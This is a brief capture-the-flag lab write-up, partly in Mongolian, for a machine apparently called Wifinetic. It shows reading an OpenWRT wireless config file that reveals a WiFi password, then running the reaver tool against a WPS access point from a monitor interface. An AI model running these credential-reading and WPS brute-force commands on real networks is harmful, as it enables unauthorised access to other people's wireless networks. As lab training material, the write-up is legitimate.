# Wifinetic - OpenWRT / Reaver WPS Cracker

```bash
# OpenWRT monitor systems config file.
cat /etc/config/wireless
```

netadmin: `VeRyUniUqWiFIPasswrd1!`

[image]

## Reaver is WPS cracker tool

`/usr/bin/reaver`

[image]

`ifconfig` командаар харвал маш олон network interface байгааг харж болно.

[image]

## Exploit!

```bash
reaver -i mon0 -b 02:00:00:00:00:00 -vv
```

[image]
